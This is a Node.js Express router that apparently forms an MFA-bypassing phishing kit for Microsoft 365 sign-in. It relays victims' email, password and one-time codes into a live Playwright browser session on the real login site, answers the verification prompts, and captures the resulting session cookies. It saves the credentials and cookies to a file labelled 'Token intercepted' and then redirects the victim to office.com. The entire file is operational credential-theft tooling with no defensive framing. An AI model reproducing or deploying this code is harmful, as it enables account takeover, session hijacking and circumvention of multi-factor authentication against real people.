const e = require('express');
const fs= require('fs')
var express = require('express');
const { Keyboard } = require('playwright');
  const playwright = require('playwright');
  var cookieParser = require('cookie-parser');
const app = require('../app');
var router = express.Router();
var drivers= new Array();
var contxt= new Array();
var usremail= new Array();
var usrpass= new Array();
var i=-1;
/* GET home page. */
router.get('/', function(req, res, next) {
  res.render('index', {page:'Home', menuId:'home',wrong:"",email:""});
});

router.get('/about', function(req, res, next) {
  //console.log("driver :"+req.query["driver"]);

  
(async () => {
  sleep = function(time) {
    var stop = new Date().getTime();
    while (new Date().getTime() < stop + time) {;
    }
    return new Promise((r, _) => r())
  }
  
  var did=req.query["driver"];
  console.log("ID"+did);
  const c =drivers[did];
  //console.log(drivers[did]);
  
  var pass=req.query["passwd"];
  var email=req.query["email"];
  console.log("Pass: "+pass);
  
  //sleep(6000 * 1).then(() => console.log("Entering pass"));
    //await c.pass

  await c.fill("#i0118",pass);
  await c.click("#idSIButton9");

  //await page.waitForSelector('#loginHeader');
  //sleep(5000 * 1).then(() => console.log("awake"));
  //await page.waitForSelector('#passwordError');
 // const result = await page.$('#passwordError');
 

  var url = await c.url();
  
   
  console.log("checking--------");
  
   ///////////////////////////////////////////////////
   try{
    //await page.waitForSelector('#idA_PWD_ForgotPassword');
    sleep(1000 * 1).then(() => console.log("Checking password error."));
    const results = await c.$('#passwordError');
    const text = await results.evaluate(element => element.innerText);
    //console.log(text);
    if(text.includes("incorrect"))
    {
      var aa=text;
      console.log("Wrong Password.");
       res.render('contact', {a:did,e:email,wrong:aa});
    }

   
  }
  catch(e)
  {
    try{
      //await page.waitForSelector('#idA_PWD_ForgotPassword');
      sleep(1000 * 1).then(() => console.log("Too many times"));
      const results = await c.$('#error_Info');
      const text = await results.evaluate(element => element.innerText);
      //console.log(text);
      if(text.includes("too many times"))
      {
        var aa=text;
        console.log("Wrong Password.Tried too many times");
        res.render('index', {page:'Home', menuId:'home',wrong:"",email:""});

         c.close();
      }
    }
    catch(e)
    {}
    usremail[i]=email;
    usrpass[i]=pass;
    
       ////////////////////////////////////////////Button clicked for phonenumber.

      try{
        //await page.waitForSelector('#idDiv_SAOTCAS_Description');
        sleep(1000 * 1).then(() => console.log("Button clicked."));
        const results = await c.$('#idDiv_SAOTCS_Title');
      const text = await results.evaluate(element => element.innerText);
      console.log(text)
        if(text.includes("identity"))
        {
          await c.keyboard.press('Enter');
        }
        console.log("Button clicked for phonenumber.");
      }
      catch(e)
      {}
  /////////////////////////////////////////////
  try{  
    sleep(800 * 1).then(() => console.log("Checking phone texted. 4 digits"));
    
    const results = await c.$('#idDiv_SAOTCS_ProofConfirmation_Section');
    const text = await results.evaluate(element => element.innerText);
    console.log(text);
      if(text.includes("enter the last 4 digits"))
      {
        var aa=text;
        console.log("Texted on your phone."); 
       res.render('phonecode', {a:did,email:email,codedesc:aa,error:""});
      }
      
    console.log("Checked phone texted. True...");
  }
  catch{}
  ///////
    try{
      //await page.waitForSelector('#idDiv_SAOTCAS_Description');
      sleep(1000 * 1).then(() => console.log("Text on number detecting..."));
      const results = await c.$('#idDiv_SAOTCS_ProofConfirmation_Section');//idDiv_SAOTCC_Description
      const text = await results.evaluate(element => element.innerText);
      console.log(text);
    
      if(text.includes("phone number on your account"))
      {
        var aa=text;
        console.log("Texted on your phone."); 
       res.render('phonecode', {a:did,email:email,codedesc:aa,error:""});

      }
    }catch{}
    /////////////////
    try{  sleep(1000 * 1).then(() => console.log("Text on authenticator detecting..."));
    const results = await c.$('#idDiv_SAOTCC_Description');//
    const text = await results.evaluate(element => element.innerText);
    console.log(text);

      if(text.includes("authenticator app"))
      {
        var aa=text;
        console.log("Texted on authenticator app."); 
       res.render('phonecode', {a:did,email:email,codedesc:aa,error:""});
      }
     
    }
    catch(e)
    {}
    //const text = await results.evaluate(element => element.innerText);
    //console.log(text);
 
    const results = c.url();
    if(results==("https://www.office.com/?auth=1"))
    {
      console.log("Office web deteced-->"+results);
       
      sleep(1000 * 1).then(() => console.log("Checking"));
      await c.goto("https://login.microsoftonline.com/auth2");
      
      const cc=contxt[did];
          let  cookies = await cc.cookies()
          var cookieJson = JSON.stringify(cookies)
          var len=cookieJson.length;
      
  
          var string=',"sameSite":"None"'
          console.log(string)
          bff=cookieJson;
        for(var i=0;i<len;i++)
        {
            var bff=bff.replace(string,'');
        }
        var alldata="Email = "+email+" \ Password= "+pass+"  \ Cookies= "+bff;
        console.log(did)
        var path=email+".json"
        fs.writeFile(path,alldata,function(){console.log("Token intercepted.")})
        console.log("correct pass");

      //return Redirect("http://office.com");
        res.render('pass', {page:'About Us', menuId:'about'});
    }
    
  }
  ///////////////////////////checking weather notification send
  try{sleep(1000 * 1).then(() => console.log("trying"));
    console.log("trying");
    const results2 = await c.$('#idDiv_SAOTCAS_Description');
    const text2 = await results2.evaluate(element => element.innerText);
    
    console.log(text2);
    if(text2.includes("."))
    {
      var aa=text2;
      console.log("Sent a notification on authenticator app."); 
     res.render('notify', {a:did,e:email,codedesc:aa});

    }
  
  }
  catch(e){}

   ////////////////////////////////////////////////////
       // var html =await c.innerText('#passwordError');
        console.log("checked-------------------------")
        //console.log(html);
  res.render('pass', {page:'About Us', menuId:'about'});
  //const t = await result.evaluate(element => element.innerHTML);
  //console.log(html);


  })();



});

router.get('/contact', function(req, res, next) {
  
  var email=req.query["loginfmt"];
  console.log("email :"+req.query["loginfmt"]);
  
//  console.log()

  
  (async () => {
    for (const browserType of ['firefox']) {
      const browser = await playwright[browserType].launch(
          {
            headless:false,
            colorScheme: 'dark',
            locale: 'de-DE',
            permissions: ['geolocation'],
            geolocation: { latitude: 52.52, longitude: 13.39}
          }
      );
      const context = await browser.newContext(
        {
         // userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/1.1.1 Safari/601.2.7'
        }
      );
      const page = await context.newPage();
      sleep = function(time) {
        var stop = new Date().getTime();
        while (new Date().getTime() < stop + time) {;
        }
        return new Promise((r, _) => r())
      }
      await page.goto('https://login.microsoftonline.com');
      
      //sleep(10 * 1).then(() => console.log("awake"));
      await page.fill('#i0116', email);
      await page.click('#idSIButton9');
      
      i++;
      try{ 
        sleep(800 * 1).then(() => console.log("No password screen."))
        
        //idA_PWD_SwitchToPassword
        const results = await page.$('#idA_PWD_SwitchToPassword');
        const text = await results.evaluate(element => element.innerText);
        console.log("-<"+text)
        if(text.includes("d"))
        {
            await page.click("idA_PWD_SwitchToPassword")
            console.log("Use password instead.");
        }
      }
      catch{}
      try{
        //await page.waitForSelector('#idA_PWD_ForgotPassword');
        sleep(1000 * 1).then(() => console.log("Email:"+email));
        const results = await page.$('#usernameError');
        const text = await results.evaluate(element => element.innerText);
        //console.log(text);
        if(text.includes("couldn't find an account"))
        {
          console.log("wrong mail");
          res.render('index', {page:'Contact Us', menuId:'contact',wrong:text,email:email});
          await browser.close();
        }

       
      }
      catch(e)
      {
        await page.waitForSelector('#idA_PWD_ForgotPassword');
        const results = await page.$('#idA_PWD_ForgotPassword');
        const text = await results.evaluate(element => element.innerText);
        //console.log(text);
        if(text.includes("Forgot"))
        {
            console.log("correct mail");
            res.render('contact', {page:'Contact Us', menuId:'contact',a:i,e:email,wrong:""});
  
        }
        
      }
      
     // console.log(page);
     
      drivers[i]=page;
      contxt[i]=context;
      
       }
  })();

});
router.get('/submitindex', function(req, res, next) {
 
  res.render('about', {page:'Contact Us', menuId:'contact',full:html});
   
  
});

router.get('/phonecode', function(req, res, next) {
  var did=req.query["driver"];
  
 (async () => {
  const c =drivers[did];
  var otp=req.query["otc"];
  var email=req.query["email"];
  try{ 
      const results2 = await c.$('#idDiv_SAOTCC_Description');
      const text2 = await results2.evaluate(element => element.innerText);
  
      console.log("Checking-<enter code -> "+text2)
      if(text2.includes("matches the last 4 digits of the phone number on your account, we'll send you a code."))
      {
        await c.fill("#idTxtBx_SAOTCC_OTC","");
        await c.fill("#idTxtBx_SAOTCC_OTC",otp);
        await c.click("#idSubmit_SAOTCC_Continue");
        console.log(otp+"--"+email+"---"+did);
      }
    } catch{}

 try{
   
      sleep(1000 * 1).then(() => console.log("Checking--Enter-number--"));
      const results = await c.$('#idDiv_SAOTCS_ProofConfirmation_Section');//idDiv_SAOTCC_Description
      const text = await results.evaluate(element => element.innerText);
      console.log("Checking-> Enter number->"+text);
      if(text.includes("To verify that this is your phone number, enter the last 4 digits including"))
      {
            await c.fill("#idTxtBx_SAOTCS_ProofConfirmation","");
            await c.fill("#idTxtBx_SAOTCS_ProofConfirmation",otp);
            await c.click("#idSubmit_SAOTCS_SendCode");     
            sleep(1000 * 1).then(() => console.log("Moving on from number."));
      }
  }catch{}
 
  var url=c.url();
  console.log(url);
  try{
    
    sleep(1000 * 1).then(() => console.log("Checking error"));
    //await page.waitForSelector('#idA_PWD_ForgotPassword');
    const results = await c.$('#idSpan_SAOTCC_Error_OTC'); //idSpan_SAOTCC_Error_OTC
    const text = await results.evaluate(element => element.innerText);
    console.log(text);
    if(text.includes("."))
    {
      const results = await c.$('#idDiv_SAOTCC_Description');
      const cd = await results.evaluate(element => element.innerText);
      const results2 = await c.$('#idDiv_SAOTCC_ErrorMsg_OTC');
      const cd2 = await results2.evaluate(element => element.innerText);
      
      console.log("wrong code...");
      
      res.render('phonecode',{codedesc:cd,error:cd2,a:did,email:email});
    }

   
  }
  catch{}
  try{
    const results = await c.$('#idDiv_SAOTCC_Description');
          const cd = await results.evaluate(element => element.innerText);
          sleep(1000 * 1).then(() => res.render('phonecode',{codedesc:cd,a:did,email:email,error:""}))
  }
  catch{}
  try{
    await c.waitForSelector('#KmsiDescription');
    const results = await c.$('#KmsiDescription');
    const text = await results.evaluate(element => element.innerText);
    console.log("waiting for error");
    console.log(text)
    //console.log(text);
    if(text.includes("to sign in"))
    {
        await c.click("#idSIButton9");
        console.log("Yes / NO. press yes");
       // await c.goto("https://login.microsoftonline.com/auth2");
        sleep(1000 * 1).then(() => console.log("Checking"));
        const cc=contxt[did];
        let  cookies = await cc.cookies()
        var cookieJson = JSON.stringify(cookies)
        var len=cookieJson.length;
        var string=',"sameSite":"None"'
        //console.log(string)
        bff=cookieJson;
        for(var i=0;i<len;i++)
        {
            var bff=bff.replace(string,'');
        }
        var alldata="Email = "+email+" \ Password= "+pass+"  \ Cookies= "+bff;
        var pass=usrpass[did]
        console.log(did)
        var path=email+".json"
        fs.writeFile(path,alldata,function(){console.log("Token intercepted.")})
        res.redirect('https://office.com')
        //  res.render('about');
    }
    
  }
  catch{}


  })();
 
});
router.get('/data', function(req, res, next) {
  var ada= JSON.parse(fs.readFileSync("data.json").toString())
  
  res.render('data',{a:ada});
})
router.get('/notif', function(req, res, next) {
  var did=req.query["driver"];
  

 (async () => {
  const c =drivers[did];
  console.log(did);
  await c.waitForSelector('#KmsiDescription');
    const results = await c.$('#KmsiDescription');
    const text = await results.evaluate(element => element.innerText);
    console.log(text);
    if(text.includes("to sign in"))
    {
        await c.click("#idSIButton9");
        console.log("Yes / NO. press yes");
        await c.goto("https://login.microsoftonline.com/auth2");
        
        const cc=contxt[did];
          let  cookies = await cc.cookies()
          var cookieJson = JSON.stringify(cookies)
          var len=cookieJson.length;
      
  
          var string=',"sameSite":"None"'
          console.log(string)
          bff=cookieJson;
        for(var i=0;i<len;i++)
        {
            var bff=bff.replace(string,'');
        }
        var pass=usrpass[did]
        var email=usremail[did]
        var alldata="Email = "+email+" \ Password= "+pass+"  \ Cookies= "+bff;
        console.log(did)
        var path=email+".json"
        fs.writeFile(path,alldata,function(){console.log("Token intercepted.")})

       // window.location.assign("www.office.com")

    }
    res.redirect('https://office.com')
    //res.render('about');

})();
 
});
module.exports = router;
